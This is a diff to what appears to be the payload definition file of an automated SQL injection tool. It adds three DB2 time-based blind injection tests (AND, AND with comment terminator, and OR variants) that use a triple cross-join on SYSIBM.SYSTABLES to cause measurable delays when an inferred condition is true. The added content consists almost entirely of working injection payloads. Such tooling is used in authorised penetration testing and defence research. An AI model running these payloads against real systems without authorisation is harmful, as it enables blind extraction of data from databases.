@@ -2195,6 +2195,45 @@ Formats:
             <dbms_version>&gt;= 2.0</dbms_version>
         </details>
     </test>
+
+    <test>
+        <title>DB2 AND time-based blind (heavy query)</title>
+        <stype>5</stype>
+        <level>2</level>
+        <risk>2</risk>
+        <clause>1,2,3</clause>
+        <where>1</where>
+        <vector>AND [RANDNUM]=(SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3 WHERE ([INFERENCE]))</vector>
+        <request>
+            <payload>AND [RANDNUM]=(SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3)</payload>
+        </request>
+        <response>
+            <time>[DELAYED]</time>
+        </response>
+        <details>
+            <dbms>DB2</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>DB2 AND time-based blind (heavy query - comment)</title>
+        <stype>5</stype>
+        <level>5</level>
+        <risk>2</risk>
+        <clause>1,2,3</clause>
+        <where>1</where>
+        <vector>AND [RANDNUM]=(SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3 WHERE ([INFERENCE]))</vector>
+        <request>
+            <payload>AND [RANDNUM]=(SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3)</payload>
+            <comment>--</comment>
+        </request>
+        <response>
+            <time>[DELAYED]</time>
+        </response>
+        <details>
+            <dbms>DB2</dbms>
+        </details>
+    </test>
     <!-- TODO: if possible, add payload for Microsoft Access and SAP MaxDB -->
     <!-- End of AND time-based blind tests -->
 
@@ -2374,6 +2413,25 @@ Formats:
         <details>
             <dbms>Firebird</dbms>
             <dbms_version>&gt;= 2.0</dbms_version>
+        </details>
+    </test>
+
+    <test>
+        <title>DB2 OR time-based blind (heavy query)</title>
+        <stype>5</stype>
+        <level>3</level>
+        <risk>3</risk>
+        <clause>1,2,3</clause>
+        <where>2</where>
+        <vector>OR [RANDNUM]=(SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3 WHERE ([INFERENCE]))</vector>
+        <request>
+            <payload>OR [RANDNUM]=(SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3)</payload>
+        </request>
+        <response>
+            <time>[DELAYED]</time>
+        </response>
+        <details>
+            <dbms>DB2</dbms>
         </details>
     </test>
     <!-- TODO: if possible, add payload for Microsoft Access and SAP MaxDB -->
